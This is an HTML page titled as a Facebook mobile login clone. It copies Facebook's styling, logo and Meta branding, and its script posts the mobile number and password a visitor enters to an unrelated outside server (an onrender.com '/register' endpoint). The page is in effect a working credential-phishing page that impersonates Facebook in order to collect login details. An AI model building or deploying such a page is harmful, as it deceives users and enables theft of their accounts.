<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Mobile Login Clone</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .login-container { width: 100%; max-width: 400px; text-align: center; padding: 20px; }
    .login-container img { width: 60px; margin-bottom: 40px; }
    input { width: 100%; padding: 14px; margin: 8px 0; border-radius: 15px; border: 1px solid #ddd; font-size: 16px; }
    button { width: 100%; padding: 14px; margin: 12px 0; border: none; border-radius: 20px; background-color:#2565d6; color: white; font-size: 18px; cursor: pointer; }
    button:hover { background-color: #165ece; }
    a { display: block; margin: 8px 0; color:black; font-weight:500; text-decoration: none; font-size: 14px; }
    .create-account { border: 1px solid #1877f2; background-color: white; color:#165ece; font-weight: 500; border-radius:20px; font-size:15px; }
    .create-account:hover { background-color: #e7f3ff; }
    .meta-logo { margin-top: 20px; font-size: 24px; color: #1877f2; }
    #message { margin-top: 10px; color: red; font-weight: bold; }
  </style>
</head>
<body>

  <div class="login-container">
    <!-- Facebook logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook Logo">

    <!-- Login form -->
    <form id="loginForm">
      <input type="text" name="number" placeholder="Mobile number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div id="message"></div>

    <!-- Create account -->
    <button class="create-account">Create New Account</button>

    <!-- Meta logo -->
    <div class="meta-logo">Meta</div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const msg = document.getElementById('message');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const number = form.number.value.trim();
      const password = form.password.value.trim();

      // Frontend validation
      if (!number || !password) {
        msg.textContent = 'Both number and password are required!';
        return;
      }
      if (!/^\d{10}$/.test(number)) {
        msg.textContent = 'Number must be exactly 10 digits.';
        return;
      }
      if (password.length < 8) {
        msg.textContent = 'Password must be at least 8 characters.';
        return;
      }

      // Send to backend
      try {
        const res = await fetch('https://abhishek-3nzy.onrender.com/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ number, password })
        });
        const text = await res.text();
        msg.textContent = text;
      } catch (err) {
        msg.textContent = 'Error connecting to server';
      }
    });
  </script>

</body>
</html>
